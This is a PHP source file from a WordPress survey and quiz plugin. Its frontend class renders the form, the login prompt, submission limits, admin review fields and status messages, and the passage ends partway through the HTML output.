<?php
/*  *
 * WP Feedback, Surver & Quiz Manager - Pro Form Elements Class
 * Frontend APIs
 *
 * Populates the actual form with all the hooks and filters
 *
 * @package WP Feedback, Surver & Quiz Manager - Pro
 * @subpackage Form Elements
 * @author Swashata Ghosh <swashata@intechgrity.com>
 */
class IPT_FSQM_Form_Elements_Front extends IPT_FSQM_Form_Elements_Data {
	/*  *
	 * UI Instance
	 *
	 * @var IPT_Plugin_UIF_Front
	 */
	public $ui;

	public $doing_admin;

	public $can_submit;

	public function __construct( $data_id = null, $form_id = null ) {
		$this->ui = IPT_Plugin_UIF_Front::instance( 'ipt_fsqm' );
		$this->doing_admin = false;
		$this->can_submit = true;
		parent::__construct( $data_id, $form_id );

		$this->ui->enqueue( plugins_url( '/lib/', IPT_FSQM_Loader::$abs_file ), IPT_FSQM_Loader::$version );
		$this->enqueue();
	}

	/*  ==========================================================================
	 * File dependencies and enqueue
	 *========================================================================*/

	public function enqueue() {
		wp_enqueue_script( 'jquery-cookie', plugins_url( '/lib/js/jquery-cookie.js', IPT_FSQM_Loader::$abs_file ), array( 'jquery' ), IPT_FSQM_Loader::$version );
		wp_enqueue_script( 'jquery-sayt', plugins_url( '/lib/js/sayt.min.jquery.js', IPT_FSQM_Loader::$abs_file ), array( 'jquery' ), IPT_FSQM_Loader::$version );
		wp_enqueue_script( 'ipt-fsqm-front-js', plugins_url( '/static/front/js/jquery.ipt-fsqm-form.js', IPT_FSQM_Loader::$abs_file ), array( 'jquery' ), IPT_FSQM_Loader::$version );
		wp_localize_script( 'ipt-fsqm-front-js', 'iptFSQM', array(
				'location' => trailingslashit( plugins_url( '/static/front/', IPT_FSQM_Loader::$abs_file ) ),
				'version' => IPT_FSQM_Loader::$version,
				'ajaxurl' => admin_url( 'admin-ajax.php' ),
				'l10n' => array(
					'uploader_active_upload' => __( 'File upload in progress, please wait.', 'ipt_fsqm' ),
					'uploader_required' => __( 'Please select at least one file.', 'ipt_fsqm' ),
					'uploader_required_number' => __( 'Minimum number of required files:', 'ipt_fsqm' ),
					'validation_on_submit' => __( 'Please go through all containers and validate the marked items.', 'ipt_fsqm' ),
					'reset_confirm' => __( 'Action can not be undone. You will also lose any saved progress. Are you sure?', 'ipt_fsqm' ),
				),
		) );
		do_action( 'ipt_fsqm_form_elements_front_enqueue', $this );
	}

	public function custom_style() {
		if ( true !== $this->settings['theme']['custom_style'] ) {
			return;
		}

		$webfonts = $this->get_available_webfonts();
		$head_font = $webfonts[$this->settings['theme']['style']['head_font']];
		$body_font = $webfonts[$this->settings['theme']['style']['body_font']];
		$font_size = (int) $this->settings['theme']['style']['base_font_size'];
		if( $font_size < 10 ) {
			$font_size = 12;
		}
		$head_font_typo = $this->settings['theme']['style']['head_font_typo'];
		?>
<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=<?php echo esc_attr( $head_font['include'] . '|' . $body_font['include'] ); ?>" />
<style type="text/css">
	/*  ==============================================================================
	 * Font Family
	 *============================================================================*/
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_tabs.ui-tabs .ui-tabs-nav li a span,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget input,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget select,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget textarea,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget button,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ipt_uif_divider span.ipt_uif_divider_text span.subtitle {
		font-family: <?php echo $body_font['label']; ?>;
	}
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h1,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h2,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h3,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h4,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h5,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> h6,
	body .ipt_fsqm_form_tabs .ui-tabs-nav,
	#ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_uif_matrix thead,
	#ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_uif_matrix th,
	body .ipt_fsqm_form_sda .ipt_fsqm_form_sda_head,
	body .ui-dialog .ui-dialog-title,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> ul.ipt_fsqm_form_ul_menu li a,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_fsqm_form_message,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_uif_tabs.ui-tabs .ui-tabs-nav li,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_uif_question .ipt_uif_question_label .ipt_uif_question_title,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ipt_uif_divider {
		font-family: <?php echo $head_font['label']; ?>;
		font-weight: <?php echo ( $head_font_typo['bold'] == true ? 'bold' : 'normal' ); ?>;
		font-style: <?php echo ( $head_font_typo['italic'] == true ? 'italic' : 'normal' ); ?>;
	}

	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> .ui-widget,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> p,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> ul,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> ol,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> table,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?> div,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget input,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget select,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget textarea,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common .ui-widget button,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common input,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common select,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common textarea,
	body #ipt_fsqm_form_wrap_<?php echo $this->form_id ?>.ipt_uif_common button {
		font-size: <?php echo $font_size; ?>px;
	}
	<?php echo $this->settings['theme']['style']['custom']; ?>
</style>
		<?php
	}

	public function no_script() {
		?>
<noscript>
	<div class="ipt_fsqm_form_message_noscript ui-widget ui-widget-content ui-corner-all">
		<div class="ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
			<h3><?php _e( 'Javascript is disabled', 'ipt_fsqm' ); ?></h3>
		</div>
		<div class="ui-widget-content ui-corner-bottom">
			<p><?php _e( 'Javascript is disabled on your browser. Please enable it in order to use this form.', 'ipt_fsqm' ); ?></p>
		</div>
	</div>
</noscript>
		<?php
	}

	public function container( $callback, $init_loader = false ) {
		if ( !$this->ui->check_callback( $callback ) ) {
			$this->ui->msg_error( __( 'System fault (invalid cb)', 'ipt_fsqm' ) );
			return;
		}
		$theme = $this->get_theme_by_id( $this->settings['theme']['template'] );
		// Include the JS
		// @since v2.4.0
		if ( isset( $theme['js'] ) && ! empty( $theme['js'] ) ) {
			foreach ( (array) $theme['js'] as $js_id => $js_src ) {
				wp_enqueue_script( 'ipt_fsqm_custom_js-' . $js_id, $js_src, array( 'ipt-fsqm-front-js' ), IPT_FSQM_Loader::$version );
			}
		}
		$this->custom_style();
		?>
<div id="ipt_fsqm_form_wrap_<?php echo $this->form_id ?>" class="ipt_uif_front ipt_uif_common ipt_fsqm_form type_<?php echo $this->type; ?>" data-ui-type="<?php echo esc_attr( $this->type ); ?>" data-ui-theme="<?php echo esc_attr( json_encode( $theme['include'] ) ); ?>" data-ui-theme-id="<?php echo esc_attr( $this->settings['theme']['template'] ); ?>" data-animation="<?php echo ( $this->settings['theme']['waypoint'] == true ? 1 : 0 ); ?>">
	<?php $this->no_script(); ?>
	<?php if ( $init_loader ) : ?>
	<?php $this->ui->ajax_loader( false, '', array(), true, __( 'Loading', 'ipt_fsqm' ), array( 'ipt_uif_init_loader' ) ); ?>
	<div style="display: none;" class="ipt_uif_hidden_init">
	<?php endif; ?>
	<?php call_user_func_array( $callback[0], $callback[1] ); ?>
	<?php if ( $init_loader ) : ?>
	</div>
	<?php endif; ?>
</div>
		<?php
	}

	public function print_login_message() {
		$current_url = IPT_FSQM_Form_Elements_Static::get_current_url();
		ob_start();
		if ( $this->settings['limitation']['logged_in_fallback'] == 'redirect' ) {
			$redirect_url = str_replace( '_self_', urlencode( $current_url ), $this->settings['limitation']['non_logged_redirect'] );
			?>
<p><?php printf( __( 'You will be redirected to the login page in 5 seconds. If you wish to proceed immediately then please <a href="$1%s">click here</a>', 'ipt_fsqm' ), $redirect_url ); ?></p>
<script type="text/javascript">
	setTimeout(function() {
		window.location.href = '<?php echo $redirect_url; ?>';
	}, 5000);
</script>
			<?php
		} else {
			$ui = $this->ui;
			$defaults = array(
				'echo' => true,
				'redirect' => $current_url,
				'form_id' => 'ipt_fsqm_up_login',
				'label_username' => __( 'Username' ),
				'label_password' => __( 'Password' ),
				'label_remember' => __( 'Remember Me' ),
				'label_log_in' => __( 'Log In' ),
				'id_username' => 'ipt_fsqm_up_user_name',
				'id_password' => 'ipt_fsqm_up_user_pwd',
				'id_remember' => 'ipt_fsqm_up_rmm',
				'id_submit' => 'wp-submit',
				'remember' => true,
				'value_username' => '',
				'value_remember' => false, // Set this to true to default the "Remember me" checkbox to checked
			);
			$args = wp_parse_args( array(), apply_filters( 'login_form_defaults', $defaults ) );
			$login_buttons = array();
			$login_buttons[] = array(
				__( 'Login', 'ipt_fsqm' ),
				'wp-submit',
				'normal',
				'none',
				'normal',
				array(),
				'submit',
				array(),
				array(),
				'',
				'switch',
			);

			if ( get_option( 'users_can_register', false ) ) {
				$login_buttons[] = array(
					__( 'Register', 'ipt_fsqm' ),
					'ipt_fsqm_up_reg',
					'normal',
					'none',
					'normal',
					array(),
					'button',
					array(),
					array( 'onclick' => 'javascript:window.location.href="' . wp_registration_url() . '"' ),
					'',
					'signup',
				);
			}

			$login_buttons[] = array(
				__( 'Forgot Password', 'ipt_fsqm' ),
				'ipt_fsqm_up_rpwd',
				'normal',
				'none',
				'normal',
				array(),
				'button',
				array(),
				array( 'onclick' => 'javascript:window.location.href="' . wp_lostpassword_url( $current_url ) . '"' ),
				'',
				'info3',
			);
			?>

<form action="<?php echo esc_url( site_url( 'wp-login.php', 'login_post' ) ); ?>" name="<?php echo $args['form_id']; ?>" id="<?php echo $args['form_id']; ?>" method="post">
	<?php $login_form_top = apply_filters( 'login_form_top', '', $args ); ?>
	<?php if ( $login_form_top != '' ) : ?>
	<div class="ipt_uif_column ipt_uif_column_full">
		<div class="ipt_uif_column_inner side_margin">
			<?php echo $login_form_top; ?>
			<div class="clear"></div>
		</div>
	</div>
	<?php endif; ?>
	<div class="ipt_uif_column ipt_uif_column_half ipt_uif_column_custom">
		<div class="ipt_uif_column_inner side_margin">
			<div class="ipt_uif_question">
				<div class="ipt_uif_question_label"><label for="<?php echo $args['id_username']; ?>"><?php echo $args['label_username']; ?><span class="ipt_uif_question_required">*</span></label></div>
				<div class="ipt_uif_question_content">
					<div class="ipt_uif_icon_and_form_elem_holder">
					<input class="ipt_uif_text"
						type="text"
						placeholder="<?php echo esc_attr( $args['label_username'] ); ?>"
						name="log"
						id="<?php echo $args['id_username']; ?>"
						value="<?php echo esc_attr( $args['value_username'] ); ?>" />
					<?php $ui->print_icon_by_class( 'user5' ); ?>
					</div>
				</div>
				<div class="clear"></div>
			</div>
			<div class="clear"></div>
		</div>
	</div>
	<div class="ipt_uif_column ipt_uif_column_half ipt_uif_column_custom">
		<div class="ipt_uif_column_inner side_margin">
			<div class="ipt_uif_question">
				<div class="ipt_uif_question_label"><label for="<?php echo $args['id_password']; ?>"><?php echo $args['label_password']; ?><span class="ipt_uif_question_required">*</span></label></div>
				<div class="ipt_uif_question_content">
					<div class="ipt_uif_icon_and_form_elem_holder">
					<input class="ipt_uif_text ipt_uif_password"
						type="password"
						placeholder="<?php echo esc_attr( $args['label_password'] ); ?>"
						name="pwd"
						id="<?php echo $args['id_password']; ?>"
						value="" />
					<?php $ui->print_icon_by_class( 'quill' ); ?>
					</div>
				</div>
				<div class="clear"></div>
			</div>
			<div class="clear"></div>
		</div>
	</div>
	<div class="ipt_uif_column ipt_uif_column_full">
		<div class="ipt_uif_column_inner side_margin">
			<?php do_action( 'login_form' ); ?>
		</div>
	</div>
	<?php $login_form_middle = apply_filters( 'login_form_middle', '', $args ); ?>
	<?php if ( $login_form_middle != '' ) : ?>
	<div class="ipt_uif_column ipt_uif_column_full">
		<div class="ipt_uif_column_inner side_margin">
			<?php echo $login_form_middle; ?>
			<div class="clear"></div>
		</div>
	</div>
	<?php endif; ?>
	<?php if ( $args['remember'] ) : ?>
	<div class="ipt_uif_column ipt_uif_column_forth ipt_uif_column_custom">
		<div class="ipt_uif_column_inner side_margin">
			<div class="ipt_uif_label_column column_1">
				<input class="ipt_uif_checkbox" name="rememberme" type="checkbox" id="<?php echo esc_attr( $args['id_remember'] ); ?>" value="forever"<?php echo ( $args['value_remember'] ? ' checked="checked"' : '' ); ?> />
				<label data-labelcon="&#xe18e;" for="<?php echo esc_attr( $args['id_remember'] ); ?>"><?php echo esc_html( $args['label_remember'] ); ?></label>
			</div>
			<div class="clear"></div>
		</div>
	</div>
	<?php endif; ?>
	<div class="ipt_uif_column ipt_uif_column_three_forth ipt_uif_column_custom">
		<div class="ipt_uif_column_inner" style="margin: 0">
			<?php $ui->buttons( $login_buttons, '', 'center' ); ?>
			<div class="clear"></div>
		</div>
	</div>
	<?php $login_form_bottom = apply_filters( 'login_form_bottom', '', $args ); ?>
	<?php if ( $login_form_bottom != '' ) : ?>
	<div class="ipt_uif_column ipt_uif_column_full">
		<div class="ipt_uif_column_inner side_margin">
			<?php echo $login_form_bottom; ?>
			<div class="clear"></div>
		</div>
	</div>
	<?php endif; ?>
	<input type="hidden" name="redirect_to" data-sayt-exclude value="<?php echo esc_url( $args['redirect'] ); ?>" />
	<div class="clear"></div>
</form>
			<?php
		}
		return ob_get_clean();
	}

	/*  ==========================================================================
	 * Form Frontend
	 * Show Form
	 * Trackback
	 * Edit for Admin
	 *========================================================================*/
	/*  *
	 * Show the form
	 * @param  boolean $can_submit      Whether the user can submit the form
	 * @param  boolean $doing_admin     If admin is doing an update request
	 * @param  int  $type_override   	Override the type 0|1|2
	 * @param  boolean $print_container Whether or not to print the container
	 * @param  boolean $user_update     Whether the user is an update request, it will be overriden if the form settings doesn't support
	 * @return void
	 */
	public function show_form( $can_submit = true, $doing_admin = false, $type_override = null, $print_container = true, $user_update = false ) {
		global $wpdb, $ipt_fsqm_info;
		$auto_restore = true;
		if ( null == $this->form_id ) {
			$this->container( array( array( $this->ui, 'msg_error' ), array( __( 'Please check the code.', 'ipt_fsqm' ), true, __( 'Invalid ID', 'ipt_fsqm' ) ) ), true );
			return;
		}
		if ( $type_override !== null ) {
			$this->type = $type_override;
		}

		if ( true === $doing_admin ) {
			$this->doing_admin = true;
			$auto_restore = false;
		}

		if ( false === $can_submit ) {
			$this->can_submit = false;
			$auto_restore = false;
		}
		if ( false == $this->settings['save_progress']['auto_save'] ) {
			$auto_restore = false;
		}

		// Check for user limitation and logged_in limitation (only if it is not admin or not update)
		if ( ! $this->doing_admin && ! $user_update ) {
			// Login check
			if ( $this->settings['limitation']['logged_in'] == true && ! is_user_logged_in() && $can_submit ) {
				$this->container( array( array( $this->ui, 'msg_error' ), array( $this->print_login_message(), true, __( 'Please login to continue', 'ipt_fsqm' ), false ) ), true );
				return;
			}

			// User limit check
			if ( $this->settings['limitation']['user_limit'] == true && is_user_logged_in() && $can_submit ) {
				$total_users = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(id) FROM {$ipt_fsqm_info['data_table']} WHERE form_id = %d AND user_id = %d", $this->form_id, $this->data->user_id ) );
				if ( $total_users >= $this->settings['limitation']['user_limit'] ) {
					$this->container( array( array( $this->ui, 'msg_error' ), array( str_replace('%PORTAL_LINK%', $this->get_utrackback_url(), $this->settings['limitation']['user_limit_msg'] ), true, __( 'Oops!', 'ipt_fsqm' ) ) ), true );
					return;
				}
			}

			// Total Limit Check
			if ( $this->settings['limitation']['total_limit'] == true && $can_submit ) {
				$total_submissions = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(id) FROM {$ipt_fsqm_info['data_table']} WHERE form_id = %d", $this->form_id ) );
				if ( $total_submissions >= $this->settings['limitation']['total_limit'] ) {
					$this->container( array( array( $this->ui, 'msg_error' ), array( $this->settings['limitation']['total_limit_msg'], true, __( 'Oops!', 'ipt_fsqm' ) ) ), true );
					return;
				}
			}
		}

		if ( $this->type != 0 ) {
			$tabs = array();
			foreach ( $this->layout as $l_key => $layout ) {
				$tabs[] = array(
					'id' => 'ipt_fsqm_form_' . $this->form_id . '_tab_' . $l_key,
					'label' => $layout['title'],
					'sublabel' => $layout['subtitle'],
					'classes' => array( 'ipt_fsqm_form_tab_panel' ),
					'icon' => $layout['icon'],
					'callback' => array( array( $this, 'populate_layout' ), array( $l_key, $layout ) )
				);
			}
		}
		$theme = $this->get_theme_by_id( $this->settings['theme']['template'] );
		// Include the JS
		// @since v2.4.0
		if ( isset( $theme['js'] ) && ! empty( $theme['js'] ) ) {
			foreach ( (array) $theme['js'] as $js_id => $js_src ) {
				wp_enqueue_script( 'ipt_fsqm_custom_js-' . $js_id, $js_src, array( 'ipt-fsqm-front-js' ), IPT_FSQM_Loader::$version );
			}
		}
		$user_update = $user_update && $this->settings['general']['can_edit'];

		$conditionals = $this->populate_conditional_logic();

		// Get the timer
		$timer = $this->populate_timer();

		$sayt_save = array(
			'auto_save' => $this->settings['save_progress']['auto_save'],
			'show_restore' => $this->settings['save_progress']['show_restore'],
			'restore' => $auto_restore,
			'admin_override' => $this->doing_admin,
		);
?>
<?php if ( $print_container ) : ?>
<div id="ipt_fsqm_form_wrap_<?php echo $this->form_id ?>" class="ipt_uif_front ipt_uif_common ipt_fsqm_form type_<?php echo $this->type; ?>" data-fsqmsayt="<?php echo esc_attr( json_encode( (object) $sayt_save ) ); ?>" data-ui-type="<?php echo esc_attr( $this->type ); ?>" data-ui-theme="<?php echo esc_attr( json_encode( $theme['include'] ) ); ?>" data-ui-theme-id="<?php echo esc_attr( $this->settings['theme']['template'] ); ?>" data-animation="<?php echo ( $this->settings['theme']['waypoint'] == true ? 1 : 0 ); ?>">
	<?php $this->custom_style(); ?>
	<?php $this->no_script(); ?>
	<?php $this->ui->ajax_loader( false, '', array(), true, __( 'Loading', 'ipt_fsqm' ), array( 'ipt_uif_init_loader' ) ); ?>
<?php endif; ?>
	<input type="hidden" data-sayt-exclude class="ipt_uif_conditional_logic" id="ipt_uif_conditional_logic_<?php echo $this->form_id ?>" value="<?php echo esc_attr( json_encode( (object) $conditionals ) ); ?>" />
	<input type="hidden" data-sayt-exclude class="ipt_fsqm_timer_data" id="ipt_fsqm_timer_data_<?php echo $this->form_id; ?>" value="<?php echo esc_attr( json_encode( (object) $timer ) ); ?>" />
	<div style="display: none;" class="ipt_uif_hidden_init">
		<?php if ( $sayt_save['auto_save'] && ! $this->doing_admin ) : ?>
		<div style="display: none;" class="ipt_fsqm_form_message_restore ui-widget ui-widget-content ui-corner-all ipt_uif_widget_box">
			<div class="ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
				<h3><a href="#" title="<?php _e( 'Hide', 'ipt_fsqm' ); ?>" class="ipt_fsqm_form_message_close"><?php $this->ui->print_icon_by_class( 'times', false ); ?></a><?php $this->ui->print_icon_by_class( 'checkmark-circle', false ); ?><?php echo $this->settings['save_progress']['restore_head']; ?></h3>
			</div>
			<div class="ui-widget-content ui-corner-all">
				<?php echo wpautop( $this->settings['save_progress']['restore_msg'] ); ?>
				<p style="margin-bottom: 0">
					<button style="margin-bottom: 0" class="ipt_uif_button ipt_fsqm_sayt_reset"><?php echo $this->settings['save_progress']['restore_reset']; ?></button>
				</p>
			</div>
		</div>
		<?php endif; ?>
		<?php if ( '' != $this->settings['theme']['logo'] ) : ?>
		<div class="ipt_fsqm_form_logo">
			<img src="<?php echo esc_attr( $this->settings['theme']['logo'] ); ?>" alt="<?php echo esc_attr( $this->name ); ?>">
		</div>
		<?php endif; ?>
		<?php if ( $can_submit ) : ?>
		<form method="post" action="" class="ipt_uif_validate_form" id="ipt_fsqm_form_<?php echo $this->form_id ?>" autocomplete="<?php echo ( $this->settings['submission']['no_auto_complete'] ? 'off' : 'on' ); ?>">
			<?php if ( $this->data_id !== null ) : ?>
			<input type="hidden" data-sayt-exclude name="data_id" value="<?php echo esc_attr( $this->data_id ); ?>" />
			<?php endif; ?>
			<input type="hidden" data-sayt-exclude name="action" value="ipt_fsqm_save_form" />
			<?php wp_nonce_field( 'ipt_fsqm_form_data_save_' . $this->form_id, 'ipt_fsqm_form_data_save' ); ?>
			<?php if ( $user_update && $this->data_id !== null ) : ?>
			<input type="hidden" data-sayt-exclude name="user_edit" value="1" />
			<?php wp_nonce_field( 'ipt_fsqm_user_edit_' . $this->data_id, 'ipt_fsqm_user_edit_nonce', false, true ); ?>
			<?php endif; ?>
			<?php if ( ! $doing_admin && true == $this->settings['submission']['url_track'] ) : ?>
			<?php
			$url_track_val = isset( $_GET[$this->settings['submission']['url_track_key']] ) ? strip_tags( stripslashes( $_GET[$this->settings['submission']['url_track_key']] ) ) : $this->data->url_track;
			$this->ui->hidden_input( 'ipt_fsqm_form_' . $this->form_id . '[url_track]', $url_track_val );
			?>
			<?php endif; ?>
			<?php do_action( 'ipt_fsqm_hook_form_before', $this ); ?>
		<?php endif; ?>
			<?php do_action( 'ipt_fsqm_hook_form_fullview_before', $this ); ?>
			<input type="hidden" data-sayt-exclude name="form_id" value="<?php echo esc_attr( $this->form_id ); ?>" />
			<?php //var_dump($this->data); ?>
			<?php if ( $doing_admin ) : ?>
			<?php do_action( 'ipt_fsqm_hook_form_doing_admin_before', $this ); ?>
			<div class="ui-widget-content ipt_uif_mother_wrap" style="margin-bottom: 20px">
			<?php $this->ui->column_head( '', 'full', false ); ?>
			<?php $this->ui->heading( __( 'Submission Administration', 'ipt_fsqm' ), 'h3', 'center', 'none' ); ?>
			<?php $this->ui->column_tail(); ?>
			<?php endif; ?>
			<?php if ( $doing_admin ) : ?>
			<?php if ( $this->settings['general']['comment_title'] != '' ) : ?>
			<div class="ipt_uif_column ipt_uif_column_full" style="margin-bottom: 20px">
				<?php $this->ui->heading( $this->settings['general']['comment_title'], 'h3', 'left', 0xe0a2 ); ?>
				<?php $this->ui->clear(); ?>
				<?php $this->ui->textarea( 'ipt_fsqm_form_' . $this->form_id . '[comment]', $this->data->comment, __( 'Enter remarks', 'ipt_fsqm' ) ); ?>
				<?php $this->ui->clear(); ?>
			</div>
			<?php endif; ?>

			<?php if ( $this->settings['submission']['url_track'] == true ) : ?>
			<div class="ipt_uif_column ipt_uif_column_full">
				<?php $this->ui->question_container(
					'ipt_fsqm_form_' . $this->form_id . '[url_track]',
					__( 'Change URL Track Code', 'ipt_fsqm' ),
					__( 'manually enter the value', 'ipt_fsqm' ),
					array(
						array( $this->ui, 'text' ),
						array( 'ipt_fsqm_form_' . $this->form_id . '[url_track]', $this->data->url_track, __( 'Disabled', 'ipt_fsqm' ) ),
					)
				); ?>
			</div>
			<?php endif; ?>

			<?php if ( $this->settings['user']['notification_email'] != '' ) : ?>
			<div class="ipt_uif_column ipt_uif_column_full">
				<?php $this->ui->heading( __( 'Notify the surveyee/contributor', 'ipt_fsqm' ), 'h3', 'left', 0xe1a4 ); ?>
				<?php $this->ui->clear(); ?>
				<?php $this->ui->checkbox( 'ipt_fsqm_form_' . $this->form_id . '[notify]', array(
					'label' => __( 'Email the surveyee/contributor about this update.', 'ipt_fsqm' ),
					'value' => '1',
				), true ); ?>
				<?php $this->ui->clear(); ?>
				<?php $this->ui->column_head(); ?>
				<?php $this->ui->question_container(
					'ipt_fsqm_form_' . $this->form_id . '[notify_sub]',
					__( 'Notification Subject', 'ipt_fsqm' ),
					__( 'subject of the email', 'ipt_fsqm' ),
					array(
						array( $this->ui, 'text' ),
						array( 'ipt_fsqm_form_' . $this->form_id . '[notify_sub]', '[' . get_bloginfo( 'name' ) . '] ' . __( 'Your submission has been reviewed', 'ipt_fsqm' ), __( 'Please enter a subject', 'ipt_fsqm' ) ),
					)
				); ?>
				<?php $this->ui->column_tail(); ?>
				<?php $this->ui->clear(); ?>
				<?php $this->ui->column_head(); ?>
				<?php $this->ui->question_container(
					'ipt_fsqm_form_' . $this->form_id . '[notify_msg]',
					__( 'Notification Message', 'ipt_fsqm' ),
					__( 'message body of the email', 'ipt_fsqm' ),
					array(
						array( $this->ui, 'textarea' ),
						array( 'ipt_fsqm_form_' . $this->form_id . '[notify_msg]', __( "Hi %NAME%,\n\nYour submission has been reviewed by our team. To see it, please follow the link below.\n\n%TRACK_LINK%\n\nWe have also attached a copy of your submission.\n\nRegards,\n\n" . get_bloginfo( 'name' ), 'ipt_fsqm' ), __( 'Please enter a message', 'ipt_fsqm' ) ),
					)
				); ?>
				<?php $this->ui->column_tail(); ?>
			</div>
			<?php endif; ?>

			<?php $this->ui->clear(); ?>
			<?php endif; ?>

			<?php if ( $doing_admin ) : ?>
			<?php $this->ui->clear(); ?>
			</div>
			<?php endif; ?>

			<?php if ( $this->type != 0 ) : ?>
			<?php if ( $this->type == 2 && true == $this->settings['type_specific']['pagination']['show_progress_bar'] ) : ?>
			<?php $this->ui->progressbar( 'ipt_fsqm_form_' . $this->form_id . '_progressbar', '0', array( 'ipt_fsqm_main_pb' ), $this->settings['type_specific']['pagination']['decimal_point'] ); ?>
			<?php endif; ?>
			<?php $this->ui->tabs( $tabs, array( 'settings' => json_encode( (object) array(
						'can-previous' => $this->settings['type_specific']['tab']['can_previous'],
						'show-progress-bar' => $this->settings['type_specific']['pagination']['show_progress_bar'],
						// @see issue #6
						// @link https://iptlabz.com/ipanelthemes/wp-fsqm-pro/issues/6
						'block-previous' => $this->settings['type_specific']['tab']['block_previous'],
						'type' => $this->type,
						'scroll' => $this->settings['type_specific']['tab']['scroll'],
						'scroll_offset' => (float) $this->settings['type_specific']['tab']['scroll_offset'],
						'decimal-point' => (int) $this->settings['type_specific']['pagination']['decimal_point'],
				  ) ) ), false, array( 'ipt_fsqm_main_tab' ) ); ?>
			<?php else : ?>

			<?php if ( true == $this->settings['type_specific']['normal']['wrapper'] ) : ?>
			<div class="ipt_uif_mother_wrap ui-widget-content ui-widget-default">
			<?php endif; ?>

			<?php foreach ( $this->layout as $l_key => $layout ) : ?>
			<?php $this->populate_layout( $l_key, $layout ); ?>
			<?php endforeach; ?>

			<?php if ( true == $this->settings['type_specific']['normal']['wrapper'] ) : ?>
			<?php $this->ui->clear(); ?>
			</div>
			<?php endif; ?>

			<?php endif; ?>
			<?php if ( !$doing_admin && ( '0' != $this->settings['general']['terms_page'] || !empty( $this->settings['general']['terms_page'] ) ) ) : $link = get_permalink( $this->settings['general']['terms_page'] ); ?>
			<?php $terms_checked = $this->data_id != null ? true : false; ?>
			<?php $terms_ip_addr = $this->data_id != null ? $this->data->ip : $_SERVER['REMOTE_ADDR']; ?>
			<div class="ui-widget ui-widget-content ui-corner-all ipt_fsqm_terms_wrap">
				<?php $this->ui->column_head(); ?>
				<?php $this->ui->checkbox( 'ipt_fsqm_terms_' . $this->form_id, array(
				'label' => sprintf( $this->settings['general']['terms_phrase'], $link, $terms_ip_addr ),
				'value' => '1',
			), $terms_checked, array( 'required' => true ) ); ?>
				<?php $this->ui->column_tail(); ?>
			</div>
			<?php endif; ?>

			<?php if ( $can_submit ) : ?>
			<?php $this->submit_buttons(); ?>
			<?php endif; ?>
			<?php $this->ui->clear(); ?>

		<?php if ( $can_submit ) : ?>
		<?php do_action( 'ipt_fsqm_hook_form_after', $this ); ?>
		</form>
		<?php endif; ?>
	</div>
	<?php if ( $can_submit ) : ?>
	<div style="display: none;" class="ipt_fsqm_form_message_success ui-widget ui-widget-content ui-corner-all ipt_uif_widget_box">
		<div class="ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
			<h3><?php $this->ui->print_icon_by_class( 'checkmark-circle', false ); ?><?php echo $doing_admin ? __( 'Updation was successful', 'ipt_fsqm' ) : $this->settings['submission']['success_title']; ?></h3>
		</div>
		<div class="ui-widget-content ui-corner-all">
			<?php if ( $doing_admin ) : ?>
			<p><?php _e( 'The update process was successful.', 'ipt_fsqm' ); ?></p>
			<p><?php _e( 'If you have a valid user notification email and if you have checked the "Email the surveyee/contributor about this update" button, then the user has been notified with a trackback link.', 'ipt_fsqm' ) ?></p>
			<?php else : ?>
			<?php echo wpautop( $this->settings['submission']['success_message'] ); ?>
			<?php endif; ?>
		</div>
	</div>
	<div style="display: none;" class="ipt_fsqm_form_message_error ui-widget ui-widget-content ui-corner-all ipt_uif_widget_box">
		<div class="ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
			<h3><?php $this->ui->print_icon_by_class( 'laptop', false ); ?><?php _e( 'Server Side Error', 'ipt_fsqm' ); ?></h3>
